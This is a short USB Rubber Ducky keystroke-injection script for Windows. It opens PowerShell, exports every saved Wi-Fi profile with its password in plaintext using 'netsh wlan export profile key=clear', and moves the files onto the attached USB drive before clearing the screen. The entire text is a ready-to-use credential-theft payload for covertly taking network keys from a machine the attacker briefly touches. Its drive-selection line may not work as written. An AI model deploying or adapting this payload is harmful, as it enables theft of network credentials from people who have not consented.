DELAY 2
REM --> Minimize all windows
Delay 1
WINDOWS d
REM --> Open PS
WINDOWS r
DELAY 5
STRING Powershell
ENTER
DELAY 7
REM --> create variable for newest usb attached. should really use name if able
STRING $mydrive=GWmi Win32_Logicaldisk | ?{$_.Bustype -Eq "USB"}
ENTER
REM --> Get all SSID
STRING netsh wlan export profile key=clear 
ENTER
STRING get-childitem -Filter Wi-Fi* -path C:\Users\$env:Username\  | move-item -Destination $mydrive
ENTER
STRING clear
ENTER
STRING exit
ENTER
